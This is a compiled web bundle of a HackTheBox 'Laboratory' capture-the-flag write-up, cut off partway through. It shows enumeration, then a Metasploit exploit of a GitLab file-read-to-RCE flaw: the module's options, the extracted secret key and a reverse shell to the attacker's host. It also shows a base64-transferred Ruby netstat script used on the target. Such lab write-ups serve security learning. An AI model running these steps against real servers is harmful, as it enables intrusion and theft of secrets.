"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[1702],{3905:(e,t,n)=>{n.d(t,{Zo:()=>p,kt:()=>h});var r=n(67294);function a(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function o(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);t&&(r=r.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,r)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?o(Object(n),!0).forEach((function(t){a(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):o(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function s(e,t){if(null==e)return{};var n,r,a=function(e,t){if(null==e)return{};var n,r,a={},o=Object.keys(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||(a[n]=e[n]);return a}(e,t);if(Object.getOwnPropertySymbols){var o=Object.getOwnPropertySymbols(e);for(r=0;r<o.length;r++)n=o[r],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(a[n]=e[n])}return a}var l=r.createContext({}),c=function(e){var t=r.useContext(l),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},p=function(e){var t=c(e.components);return r.createElement(l.Provider,{value:t},e.children)},d="mdxType",u={inlineCode:"code",wrapper:function(e){var t=e.children;return r.createElement(r.Fragment,{},t)}},b=r.forwardRef((function(e,t){var n=e.components,a=e.mdxType,o=e.originalType,l=e.parentName,p=s(e,["components","mdxType","originalType","parentName"]),d=c(n),b=a,h=d["".concat(l,".").concat(b)]||d[b]||u[b]||o;return n?r.createElement(h,i(i({ref:t},p),{},{components:n})):r.createElement(h,i({ref:t},p))}));function h(e,t){var n=arguments,a=t&&t.mdxType;if("string"==typeof e||a){var o=n.length,i=new Array(o);i[0]=b;var s={};for(var l in t)hasOwnProperty.call(t,l)&&(s[l]=t[l]);s.originalType=e,s[d]="string"==typeof e?e:a,i[1]=s;for(var c=2;c<o;c++)i[c]=n[c];return r.createElement.apply(null,i)}return r.createElement.apply(null,n)}b.displayName="MDXCreateElement"},49280:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>l,contentTitle:()=>i,default:()=>u,frontMatter:()=>o,metadata:()=>s,toc:()=>c});var r=n(87462),a=(n(67294),n(3905));const o={layout:"post",title:"Laboratory ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","web","rce","ruby","git"],date:"2021/04/18 19:47:00",thumbnail:"/img/HackTheBox/laboratory.png",toc:!0},i="Information",s={unversionedId:"HackTheBox/Laboratory/write-up",id:"HackTheBox/Laboratory/write-up",title:"Laboratory ",description:"- Name: Laboratory",source:"@site/writeups/HackTheBox/Laboratory/write-up.md",sourceDirName:"HackTheBox/Laboratory",slug:"/HackTheBox/Laboratory/write-up",permalink:"/writeups/HackTheBox/Laboratory/write-up",draft:!1,tags:[{label:"security",permalink:"/writeups/tags/security"},{label:"writeups",permalink:"/writeups/tags/writeups"},{label:"htb",permalink:"/writeups/tags/htb"},{label:"pe",permalink:"/writeups/tags/pe"},{label:"linux",permalink:"/writeups/tags/linux"},{label:"web",permalink:"/writeups/tags/web"},{label:"rce",permalink:"/writeups/tags/rce"},{label:"ruby",permalink:"/writeups/tags/ruby"},{label:"git",permalink:"/writeups/tags/git"}],version:"current",frontMatter:{layout:"post",title:"Laboratory ",lang:"en",categories:["writeups"],tags:["security","writeups","htb","pe","linux","web","rce","ruby","git"],date:"2021/04/18 19:47:00",thumbnail:"/img/HackTheBox/laboratory.png",toc:!0},sidebar:"tutorialSidebar",previous:{title:"Jewel ",permalink:"/writeups/HackTheBox/Jewel/write-up"},next:{title:"Magic ",permalink:"/writeups/HackTheBox/Magic/write-up"}},l={},c=[{value:"Overview",id:"overview",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"Web discovery &amp; enumeration",id:"web-discovery--enumeration",level:2},{value:"Privilege Escalation of Machine : from git (container) to dexter (host)",id:"privilege-escalation-of-machine--from-git-container-to-dexter-host",level:2},{value:"Privilege Escalation of Machine : from dexter (host) to root (host)",id:"privilege-escalation-of-machine--from-dexter-host-to-root-host",level:2}],p={toc:c},d="wrapper";function u(e){let{components:t,...o}=e;return(0,a.kt)(d,(0,r.Z)({},p,o,{components:t,mdxType:"MDXLayout"}),(0,a.kt)("h1",{id:"information"},"Information"),(0,a.kt)("ul",null,(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Name:")," Laboratory"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Profile:")," ",(0,a.kt)("a",{parentName:"li",href:"https://www.hackthebox.eu/home/machines/profile/298"},"www.hackthebox.eu")),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Difficulty:")," Easy"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"OS:")," Linux"),(0,a.kt)("li",{parentName:"ul"},(0,a.kt)("strong",{parentName:"li"},"Points:")," 30")),(0,a.kt)("p",null,(0,a.kt)("img",{alt:"Laboratory",src:n(45753).Z,width:"598",height:"381"})),(0,a.kt)("h2",{id:"overview"},"Overview"),(0,a.kt)("p",null,"Install tools used in this WU on BlackArch Linux:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"$ sudo pacman -S nmap ruby-ctf-party ffuf pwncat metasploit\n")),(0,a.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,a.kt)("p",null,"Port and service discovery scan with nmap:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"# Nmap 7.91 scan initiated Sat Feb 27 21:11:02 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.10.216\nNmap scan report for 10.10.10.216\nHost is up (0.031s latency).\nNot shown: 65532 filtered ports\nPORT    STATE SERVICE  VERSION\n22/tcp  open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 25:ba:64:8f:79:9d:5d:95:97:2c:1b:b2:5e:9b:55:0d (RSA)\n|   256 28:00:89:05:55:f9:a2:ea:3c:7d:70:ea:4d:ea:60:0f (ECDSA)\n|_  256 77:20:ff:e9:46:c0:68:92:1a:0b:21:29:d1:53:aa:87 (ED25519)\n80/tcp  open  http     Apache httpd 2.4.41\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: Did not follow redirect to https://laboratory.htb/\n443/tcp open  ssl/http Apache httpd 2.4.41 ((Ubuntu))\n| http-methods:\n|_  Supported Methods: HEAD GET POST OPTIONS\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-title: The Laboratory\n| ssl-cert: Subject: commonName=laboratory.htb\n| Subject Alternative Name: DNS:git.laboratory.htb\n| Issuer: commonName=laboratory.htb\n| Public Key type: rsa\n| Public Key bits: 4096\n| Signature Algorithm: sha256WithRSAEncryption\n| Not valid before: 2020-07-05T10:39:28\n| Not valid after:  2024-03-03T10:39:28\n| MD5:   2873 91a5 5022 f323 4b95 df98 b61a eb6c\n|_SHA-1: 0875 3a7e eef6 8f50 0349 510d 9fbf abc3 c70a a1ca\n| tls-alpn:\n|_  http/1.1\nService Info: Host: laboratory.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Sat Feb 27 21:13:08 2021 -- 1 IP address (1 host up) scanned in 125.70 seconds\n")),(0,a.kt)("h2",{id:"web-discovery--enumeration"},"Web discovery & enumeration"),(0,a.kt)("p",null,"We are directly redirected to the local domaine so let's add it in ",(0,a.kt)("inlineCode",{parentName:"p"},"/etc/hosts"),"."),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ grep lab /etc/hosts\n10.10.10.216 laboratory.htb\n")),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ ffuf -u https://laboratory.htb/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -fc 403\n...\n$ ffuf -u https://laboratory.htb/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -fc 403\n...\n$ ffuf -u https://laboratory.htb/FUZZ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fc 403 -e .txt\n...\n")),(0,a.kt)("p",null,"Nothing to enumerate and it's a static HTML SPA.\nBut looking at the SSL certificate we can see another sub-domaine:\n",(0,a.kt)("inlineCode",{parentName:"p"},"Subject Alternative Name: DNS:git.laboratory.htb"),"."),(0,a.kt)("p",null,"But we could have discovered it with brute-force too:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ ffuf -u https://laboratory.htb/ -c -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt -fc 403 -H 'Host: FUZZ.laboratory.htb' -fs 7254\n\n        /'___\\  /'___\\           /'___\\\n       /\\ \\__/ /\\ \\__/  __  __  /\\ \\__/\n       \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\\n        \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/\n         \\ \\_\\   \\ \\_\\  \\ \\____/  \\ \\_\\\n          \\/_/    \\/_/   \\/___/    \\/_/\n\n       v1.3.0-git\n________________________________________________\n\n :: Method           : GET\n :: URL              : https://laboratory.htb/\n :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt\n :: Header           : Host: FUZZ.laboratory.htb\n :: Follow redirects : false\n :: Calibration      : false\n :: Timeout          : 10\n :: Threads          : 40\n :: Matcher          : Response status: 200,204,301,302,307,401,403,405\n :: Filter           : Response status: 403\n :: Filter           : Response size: 7254\n________________________________________________\n\n.git                    [Status: 302, Size: 106, Words: 5, Lines: 1]\ngit                     [Status: 302, Size: 105, Words: 5, Lines: 1]\n:: Progress: [56293/56293] :: Job [1/1] :: 1260 req/sec :: Duration: [0:01:03] :: Errors: 0 ::\n")),(0,a.kt)("p",null,"Let's edit our hosts entry:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ grep lab /etc/hosts\n10.10.10.216 laboratory.htb git.laboratory.htb\n")),(0,a.kt)("p",null,"GitLab is hosted here (make sense now the name of the box is Laboratory and the sub-domaine is ",(0,a.kt)("inlineCode",{parentName:"p"},"git"),")."),(0,a.kt)("p",null,"So let's register, and then go at ",(0,a.kt)("a",{parentName:"p",href:"https://git.laboratory.htb/help"},"https://git.laboratory.htb/help")," to find the\nversion deployed: GitLab Community Edition 12.8.1."),(0,a.kt)("p",null,"There are a bunch of low quality python Poc ou there but better use the\nhigh quality reliable metasploit ruby exploit:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"msf6 exploit(multi/http/gitlab_file_read_rce) > info\n\n       Name: GitLab File Read Remote Code Execution\n     Module: exploit/multi/http/gitlab_file_read_rce\n   Platform: Ruby\n       Arch: ruby\n Privileged: No\n    License: Metasploit Framework License (BSD)\n       Rank: Excellent\n  Disclosed: 2020-03-26\n\nProvided by:\n  William Bowling (vakzz)\n  alanfoster\n\nModule side effects:\n ioc-in-logs\n artifacts-on-disk\n\nModule stability:\n crash-safe\n\nModule reliability:\n repeatable-session\n\nAvailable targets:\n  Id  Name\n  --  ----\n  0   Automatic\n\nCheck supported:\n  Yes\n\nBasic options:\n  Name             Current Setting                                               Required  Description\n  ----             ---------------                                               --------  -----------\n  DEPTH            15                                                            yes       Define the max traversal depth\n  PASSWORD         password                                                      no        The password for the specified username\n  Proxies                                                                        no        A proxy chain of format type:host:port[,type:host:port][...]\n  RHOSTS           10.10.10.216                                                  yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'\n  RPORT            443                                                           yes       The target port (TCP)\n  SECRETS_PATH     /opt/gitlab/embedded/service/gitlab-rails/config/secrets.yml  yes       The path to the secrets.yml file\n  SECRET_KEY_BASE                                                                no        The known secret_key_base from the secrets.yml - this skips the arbitrary file read if present\n  SSL              true                                                          no        Negotiate SSL/TLS for outgoing connections\n  TARGETURI        /users/sign_in                                                yes       The path to the vulnerable application\n  USERNAME         cyfun                                                         no        The username to authenticate as\n  VHOST            git.laboratory.htb                                            no        HTTP server virtual host\n\nPayload information:\n\nDescription:\n  This module provides remote code execution against GitLab Community\n  Edition (CE) and Enterprise Edition (EE). It combines an arbitrary\n  file read to extract the Rails \"secret_key_base\", and gains remote\n  code execution with a deserialization vulnerability of a signed\n  'experimentation_subject_id' cookie that GitLab uses internally for\n  A/B testing. Note that the arbitrary file read exists in GitLab\n  EE/CE 8.5 and later, and was fixed in 12.9.1, 12.8.8, and 12.7.8.\n  However, the RCE only affects versions 12.4.0 and above when the\n  vulnerable `experimentation_subject_id` cookie was introduced.\n  Tested on GitLab 12.8.1 and 12.4.0.\n\nReferences:\n  https://cvedetails.com/cve/CVE-2020-10977/\n  https://hackerone.com/reports/827052\n  https://about.gitlab.com/releases/2020/03/26/security-release-12-dot-9-dot-1-released/\n\nmsf6 exploit(multi/http/gitlab_file_read_rce) > run\n\n[*] Started reverse TCP handler on 10.10.14.135:4444\n[*] Executing automatic check (disable AutoCheck to override)\n[+] The target appears to be vulnerable. GitLab 12.8.1 is a vulnerable version.\n[*] Logged in to user cyfun\n[*] Created project /cyfun/id1reBf3\n[*] Created project /cyfun/AOeg8gkK\n[*] Created issue /cyfun/id1reBf3/issues/1\n[*] Executing arbitrary file load\n[+] File saved as: '/home/cyfun/.msf4/loot/20210227221445_default_10.10.10.216_gitlab.secrets_687213.txt'\n[+] Extracted secret_key_base 3231f54b33e0c1ce998113c083528460153b19542a70173b4458a21e845ffa33cc45ca7486fc8ebb6b2727cc02feea4c3adbe2cc7b65003510e4031e164137b3\n[*] NOTE: Setting the SECRET_KEY_BASE option with the above value will skip this arbitrary file read\n[*] Attempting to delete project /cyfun/id1reBf3\n[*] Deleted project /cyfun/id1reBf3\n[*] Attempting to delete project /cyfun/AOeg8gkK\n[*] Deleted project /cyfun/AOeg8gkK\n[*] Command shell session 1 opened (10.10.14.135:4444 -> 10.10.10.216:33956) at 2021-02-27 22:14:47 +0100\n\nid\nuid=998(git) gid=998(git) groups=998(git)\n")),(0,a.kt)("h2",{id:"privilege-escalation-of-machine--from-git-container-to-dexter-host"},"Privilege Escalation of Machine : from git (container) to dexter (host)"),(0,a.kt)("p",null,"We can see in ",(0,a.kt)("inlineCode",{parentName:"p"},"/etc/passwd")," there is no human user on the machine\n(uid > 1000 in general) but only service accounts (default + gitlab), so we\nshould target root directly."),(0,a.kt)("p",null,"Which OS are we on?"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},'git@git:~/gitlab-rails/working$ head -2 /etc/os-release\nNAME="Ubuntu"\nVERSION="16.04.6 LTS (Xenial Xerus)"\n')),(0,a.kt)("p",null,"Also it's a docker container:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"git@git:~/gitlab-rails/working$ ls -lhA / | grep docker\n-rwxr-xr-x   1 root root    0 Jul  2  2020 .dockerenv\n")),(0,a.kt)("p",null,"Docker containers are often minimalists and try to lower the attack surface,\nhere the issue is we neither have ",(0,a.kt)("inlineCode",{parentName:"p"},"ss")," or ",(0,a.kt)("inlineCode",{parentName:"p"},"netstat")," to list local ports."),(0,a.kt)("p",null,"We can directly read ",(0,a.kt)("inlineCode",{parentName:"p"},"/proc/net/tcp")," but IP addresses and ports are hex\nencoded (in little endian) here."),(0,a.kt)("p",null,"Let's obtain only IP addresses with this command:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre"},"git@git:~/gitlab-rails/working$ cat /proc/net/tcp | cut -d ' ' -f 5\nlocal_address\n00000000:1F7C\n0100007F:23A1\n0100007F:2382\n0100007F:23E3\n0100007F:2385\n0100007F:240D\n0100007F:1F90\n0100007F:23D0\n00000000:0050\n0100007F:1F92\n00000000:0000\n00000000:0000\n0100007F:2382\n0100007F:2382\n200E0A0A:115C\n0100007F:1F92\n0100007F:240D\n0100007F:1F7C\n0100007F:23E3\n0100007F:23D0\n0100007F:D8EE\n870E0A0A:115C\n0100007F:E4EA\n0100007F:DBFA\n0100007F:E0DA\n0100007F:D87C\n0100007F:8F40\n200E0A0A:115C\n0100007F:8FC8\n820E0A0A:115C\n0100007F:23D0\n0100007F:D88C\n0100007F:8F46\n0100007F:B480\n0100007F:23D0\n0100007F:0050\n0100007F:8F48\n200E0A0A:23E7\n0100007F:23A1\n0100007F:E0E0\n200E0A0A:23E7\n0100007F:8072\n0100007F:8F44\n0100007F:2414\n0100007F:D88A\n")),(0,a.kt)("p",null,"Then let's write a short ruby script to decode them:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-ruby"},"require 'ctf_party'\n\nFile.foreach('local_address.txt') do |line|\n  ip, port = line.split(':')\n  ip = ip.scan(/.{2}/).map(&:hex2dec).reverse.join('.')\n  port = port.hex2dec\n  puts \"#{ip}:#{port}\"\nend\n")),(0,a.kt)("p",null,"And execute it:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ ruby hex2ip.rb\n0.0.0.0:8060\n127.0.0.1:9121\n127.0.0.1:9090\n127.0.0.1:9187\n127.0.0.1:9093\n127.0.0.1:9229\n127.0.0.1:8080\n127.0.0.1:9168\n0.0.0.0:80\n127.0.0.1:8082\n0.0.0.0:0\n0.0.0.0:0\n127.0.0.1:9090\n127.0.0.1:9090\n10.10.14.32:4444\n127.0.0.1:8082\n127.0.0.1:9229\n127.0.0.1:8060\n127.0.0.1:9187\n127.0.0.1:9168\n127.0.0.1:55534\n10.10.14.135:4444\n127.0.0.1:58602\n127.0.0.1:56314\n127.0.0.1:57562\n127.0.0.1:55420\n127.0.0.1:36672\n10.10.14.32:4444\n127.0.0.1:36808\n10.10.14.130:4444\n127.0.0.1:9168\n127.0.0.1:55436\n127.0.0.1:36678\n127.0.0.1:46208\n127.0.0.1:9168\n127.0.0.1:80\n127.0.0.1:36680\n10.10.14.32:9191\n127.0.0.1:9121\n127.0.0.1:57568\n10.10.14.32:9191\n127.0.0.1:32882\n127.0.0.1:36676\n127.0.0.1:9236\n127.0.0.1:55434\n")),(0,a.kt)("p",null,"While we are at it let's create a script that directly parse ",(0,a.kt)("inlineCode",{parentName:"p"},"/proc/net/tcp"),",\nalso read remote addresses, convert inode to pid will be more difficult so we'll\nskip it and won't get the process name and get the owner names is not that hard."),(0,a.kt)("p",null,"Gitlab is coded in ruby so there must be a ruby binary on the server:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"git@git:~/gitlab-rails/working$ which ruby\n/opt/gitlab/embedded/bin/ruby\n")),(0,a.kt)("p",null,"Here is ",(0,a.kt)("inlineCode",{parentName:"p"},"mini-netstat.rb"),":"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-ruby"},"require 'etc'\n\ndef decode_addr(addr)\n  ip, port = addr.split(':')\n  ip = ip.scan(/.{2}/).map{|x|x.hex.to_s}.reverse.join('.')\n  port = port.hex.to_s\n  \"#{ip}:#{port}\"\nend\n\nFile.readlines('/proc/net/tcp').each_with_index do |line, i|\n  entry = line.split(' ')\n  unless i == 0 # skip headers\n    laddr = decode_addr(entry[1])\n    raddr = decode_addr(entry[2])\n    uname = Etc.getpwuid(entry[7].to_i).name\n    puts \"#{laddr} <--\x3e #{laddr} -- #{uname}\"\n  end\nend\n")),(0,a.kt)("p",null,"Note; I have pushed a better version ",(0,a.kt)("a",{parentName:"p",href:"https://gist.github.com/S4CH/0a8e2fad71234bd6f421b7893f3c507a"},"here")),(0,a.kt)("p",null,"Let's encode it in base64:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ cat mini-netstat.rb | base64 -w 0\ncmVxdWlyZSAnZXRjJwoKVENQX1NUQVRFUyA9IHsgIyAvdXNyL3NyYy9saW51eC9pbmNsdWRlL25ldC90Y3Bfc3RhdGVzLmgKICAnMDAnOiAnVU5LTk9XTicsCiAgJ0ZGJzogJ1VOS05PV04nLAogICcwMSc6ICdFU1RBQkxJU0hFRCcsCiAgJzAyJzogJ1NZTl9TRU5UJywKICAnMDMnOiAnU1lOX1JFQ1YnLAogICcwNCc6ICdGSU5fV0FJVDEnLAogICcwNSc6ICdGSU5fV0FJVDInLAogICcwNic6ICdUSU1FX1dBSVQnLAogICcwNyc6ICdDTE9TRScsCiAgJzA4JzogJ0NMT1NFX1dBSVQnLAogICcwOSc6ICdMQVNUX0FDSycsCiAgJzBBJzogJ0xJU1RFTicsCiAgJzBCJzogJ0NMT1NJTkcnLAogICcwQyc6ICdORVdfU1lOX1JFQ1YnCn0KCmRlZiBkZWNvZGVfYWRkcihhZGRyKQogIGlwLCBwb3J0ID0gYWRkci5zcGxpdCgnOicpCiAgaXAgPSBpcC5zY2FuKC8uezJ9LykubWFwe3x4fHguaGV4LnRvX3N9LnJldmVyc2Uuam9pbignLicpCiAgcG9ydCA9IHBvcnQuaGV4LnRvX3MKICAiI3tpcH06I3twb3J0fSIKZW5kCgpwdXRzICdsb2NhbCBhZGRyZXNzJy5sanVzdCgyMikgKyAncmVtb3RlIGFkZHJlc3MnLmxqdXN0KDIyKSArICdzdGF0ZScubGp1c3QoMTIpICsgJ3VzZXJuYW1lICh1aWQpJwpGaWxlLnJlYWRsaW5lcygnL3Byb2MvbmV0L3RjcCcpLmVhY2hfd2l0aF9pbmRleCBkbyB8bGluZSwgaXwKICBlbnRyeSA9IGxpbmUuc3BsaXQoJyAnKQogIHVubGVzcyBpID09IDAgIyBza2lwIGhlYWRlcnMKICAgIGxhZGRyID0gZGVjb2RlX2FkZHIoZW50cnlbMV0pCiAgICByYWRkciA9IGRlY29kZV9hZGRyKGVudHJ5WzJdKQogICAgc3RhdGUgPSBUQ1BfU1RBVEVTW2VudHJ5WzNdLnRvX3N5bV0KICAgIHVpZCA9IGVudHJ5WzddCiAgICB1bmFtZSA9IEV0Yy5nZXRwd3VpZCh1aWQudG9faSkubmFtZQogICAgcHV0cyAiI3tsYWRkci5sanVzdCgyMil9I3tyYWRkci5sanVzdCgyMil9I3tzdGF0ZS5sanVzdCgxMil9I3t1bmFtZX0gKCN7dWlkfSkiCiAgZW5kCmVuZA==\n")),(0,a.kt)("p",null,"And write it to the target:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ printf %s 'cmVxdWlyZSAnZXRjJwoKVENQX1NUQVRFUyA9IHsgIyAvdXNyL3NyYy9saW51eC9pbmNsdWRlL25ldC90Y3Bfc3RhdGVzLmgKICAnMDAnOiAnVU5LTk9XTicsCiAgJ0ZGJzogJ1VOS05PV04nLAogICcwMSc6ICdFU1RBQkxJU0hFRCcsCiAgJzAyJzogJ1NZTl9TRU5UJywKICAnMDMnOiAnU1lOX1JFQ1YnLAogICcwNCc6ICdGSU5fV0FJVDEnLAogICcwNSc6ICdGSU5fV0FJVDInLAogICcwNic6ICdUSU1FX1dBSVQnLAogICcwNyc6ICdDTE9TRScsCiAgJzA4JzogJ0NMT1NFX1dBSVQnLAogICcwOSc6ICdMQVNUX0FDSycsCiAgJzBBJzogJ0xJU1RFTicsCiAgJzBCJzogJ0NMT1NJTkcnLAogICcwQyc6ICdORVdfU1lOX1JFQ1YnCn0KCmRlZiBkZWNvZGVfYWRkcihhZGRyKQogIGlwLCBwb3J0ID0gYWRkci5zcGxpdCgnOicpCiAgaXAgPSBpcC5zY2FuKC8uezJ9LykubWFwe3x4fHguaGV4LnRvX3N9LnJldmVyc2Uuam9pbignLicpCiAgcG9ydCA9IHBvcnQuaGV4LnRvX3MKICAiI3tpcH06I3twb3J0fSIKZW5kCgpwdXRzICdsb2NhbCBhZGRyZXNzJy5sanVzdCgyMikgKyAncmVtb3RlIGFkZHJlc3MnLmxqdXN0KDIyKSArICdzdGF0ZScubGp1c3QoMTIpICsgJ3VzZXJuYW1lICh1aWQpJwpGaWxlLnJlYWRsaW5lcygnL3Byb2MvbmV0L3RjcCcpLmVhY2hfd2l0aF9pbmRleCBkbyB8bGluZSwgaXwKICBlbnRyeSA9IGxpbmUuc3BsaXQoJyAnKQogIHVubGVzcyBpID09IDAgIyBza2lwIGhlYWRlcnMKICAgIGxhZGRyID0gZGVjb2RlX2FkZHIoZW50cnlbMV0pCiAgICByYWRkciA9IGRlY29kZV9hZGRyKGVudHJ5WzJdKQogICAgc3RhdGUgPSBUQ1BfU1RBVEVTW2VudHJ5WzNdLnRvX3N5bV0KICAgIHVpZCA9IGVudHJ5WzddCiAgICB1bmFtZSA9IEV0Yy5nZXRwd3VpZCh1aWQudG9faSkubmFtZQogICAgcHV0cyAiI3tsYWRkci5sanVzdCgyMil9I3tyYWRkci5sanVzdCgyMil9I3tzdGF0ZS5sanVzdCgxMil9I3t1bmFtZX0gKCN7dWlkfSkiCiAgZW5kCmVuZA==' | base64 -d > /tmp/mini-netstat.rb\n")),(0,a.kt)("p",null,"Let's enjoy the work:"),(0,a.kt)("pre",null,(0,a.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ /opt/gitlab/embedded/bin/ruby /tmp/mini-netstat.rb\nlocal address         remote address        state       username (uid)\n0.0.0.0:8060          0.0.0.0:0             LISTEN      root (0)\n127.0.0.1:9121        0.0.0.0:0             LISTEN      gitlab-redis (997)\n127.0.0.1:9090        0.0.0.0:0             LISTEN      gitlab-prometheus (992)\n127.0.0.1:9187        0.0.0.0:0             LISTEN      gitlab-psql (996)\n127.0.0.1:9093        0.0.0.0:0             LISTEN      gitlab-prometheus (992)\n127.0.0.1:9229        0.0.0.0:0             LISTEN      git (998)\n127.0.0.1:8080        0.0.0.0:0             LISTEN      git (998)\n127.0.0.1:9168        0.0.0.0:0             LISTEN      git (998)\n0.0.0.0:80            0.0.0.0:0             LISTEN      root (0)\n127.0.0.1:8082        0.0.0.0:0             LISTEN      git (998)\n127.0.0.1:9236        0.0.0.0:0             LISTEN      git (998)\n0.0.0.0:22            0.0.0.0:0             LISTEN      root (0)\n127.0.0.1:8080        127.0.0.1:37976       TIME_WAIT   root (0)\n127.0.0.1:57568       127.0.0.1:9090        ESTABLISHED gitlab-prometheus (992)\n127.0.0.1:57562       127.0.0.1:9090        ESTABLISHED gitlab-prometheus (992)\n127.0.0.1:58602       127.0.0.1:8082        ESTABLISHED gitlab-prometheus (992)\n127.0.0.1:56314       127.0.0.1:9229        ESTABLISHED gitlab-prometheus (992)\n127.0.0.1:8080        127.0.0.1:37978       TIME_WAIT   root (0)\n127.0.0.1:36808       127.0.0.1:9187        ESTABLISHED gitlab-prometheus (992)\n127.0.0.1:55434       127.0.0.1:9168        ESTABLISHED gitlab-prometheus (992)\n172.17.0.2:33956      10.10.14.135:4444     ESTABLISHED git (998)\n127.0.0.1:8082        127.0.0.1:58602       ESTABLISHED git (998)\n127.0.0.1:51426       127.0.0.1:80          TIME_WAIT   root (0)\n127.0.0.1:9229        127.0.0.1:56314       ESTABLISHED git (998)\n127.0.0.1:9090        127.0.0.1:57562       ESTABLISHED gitlab-prometheus (992)\n127.0.0.1:9168        127.0.0.1:55420       ESTABLISHED git (998)\n127.0.0.1:9187        127.0.0.1:36808       ESTABLISHED gitlab-psql (996)\n127.0.0.1:8080        127.0.0.1:37984       TIME_WAIT   root (0)\n127.0.0.1:55420       127.0.0.1:9168        ESTABLISHED gitlab-prometheus (992)\n127.0.0.1:9168        127.0.0.1:55436       ESTABLISHED git (998)\n127.0.0.1:9121        127.0.0.1:46208       ESTABLISHED gitlab-redis (997)\n127.0.0.1:55436       127.0.0.1:9168        ESTABLISHED gitlab-prometheus (992)\n127.0.0.1:8060        127.0.0.1:56772       ESTABLISHED gitlab-www (999)\n127.0.0.1:8080        127.0.0.1:37982       TIME_WAIT   root (0)\n127.0.0.1:46208       127.0.0.1:9121        ESTABLISHED gitlab-prometheus (992)\n172.17.0.2:60588      10.10.14.179:4444     ESTABLISHED git (998)\n127.0.0.1:9090        127.0.0.1:57568       ESTABLISHED gitlab-prometheus (992)\n127.0.0.1:9236        127.0.0.1:32882       ESTABLISHED git (998)\n127.0.0.1:32882       127.0.0.1:9236        ESTABLISHED gitlab-prometheus (992)\n127.0.0.1:56772       127.0.0.1:8060        ESTABLISHED gitlab-prometheus (992)\n127.0.0.1:9168        127.0.0.1:55434       ESTABLISHED git (998)\n")),(0,a.kt)("p",null,"There is no internal service that we'll be able to exploit, let's attack with another angle."),(0,a.kt)("p",null,"There is a public project on Gitlab: ",(0,a.kt)("a",{parentName:"p",href:"https://git.laboratory.htb/dexter/securewebsite"},"https://git.laboratory.htb/dexter/securewebsite")),(0,a.kt)("p",null,"Thx to this repository we know two 